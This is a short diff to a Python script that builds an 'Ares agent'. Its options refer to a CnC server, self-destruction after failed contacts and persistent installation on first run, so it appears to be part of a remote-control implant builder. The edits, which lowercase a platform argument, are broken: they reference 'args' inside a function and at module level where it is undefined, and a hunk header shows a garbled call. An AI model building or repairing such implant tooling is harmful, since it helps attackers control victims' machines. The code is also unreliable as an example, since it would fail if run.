@@ -8,7 +8,7 @@ import tempfile
 
 def build_agent(output, server_url, platform, hello_interval, idle_time, max_failed_connections, persist):
     prog_name = os.path.basename(output)
-    platform = platform.lower()
+    platform = args.platform.lower()
     if platform not in ['linux', 'windows']:
         print "[!] Supported platforms are 'Linux' and 'Windows'. Please specify a valid platform."
         exit(1)
@@ -68,6 +68,7 @@ args = parser.parse_args()(description="Builds an Ares agent.")
     parser.add_argument('--max-failed-connections', type=int, default=20, help="The agent will self destruct if no contact with the CnC can be made <max_failed_connections> times in a row.")
     parser.add_argument('--persistent', action='store_true', help="Automatically install the agent on first run.")
     args = parser.parse_args()
+    args.platform = args.platform.lower()
 
     build_agent(
         output=args.output,
@@ -81,3 +82,4 @@ args = parser.parse_args()(description="Builds an Ares agent.")
 
 if __name__ == "__main__":
     main()
+args.platform = args.platform.lower()
